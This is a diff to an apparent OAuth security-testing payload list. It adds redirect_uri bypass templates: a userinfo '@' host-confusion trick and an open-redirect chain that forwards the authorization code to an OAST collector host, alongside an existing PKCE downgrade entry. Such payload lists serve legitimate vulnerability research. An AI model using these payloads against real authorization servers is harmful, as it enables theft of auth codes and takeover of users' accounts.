@@ -35,6 +35,14 @@ payloads:
     template: 'plain'
     confidence: suspected
     notes: code_challenge_method downgrade to plain (PKCE bypass research).
+  - id: redirect_uri_userinfo
+    template: "https://{registered_redirect_uri}@{oast_host}/cb"
+    confidence: suspected
+    notes: WHATWG userinfo-delimiter host confusion; prefix-match validators without a trailing slash can be bypassed this way.
+  - id: redirect_uri_open_redirect_chain
+    template: "{registered_redirect_uri}/redirect?to=https://{oast_host}/{canary}"
+    confidence: suspected
+    notes: Chains an open-redirect on the whitelisted host to bounce the auth code to an OAST collector.
 mutations:
   - name: case_flip
     description: URL/scheme case flips defeat naive substring filters.
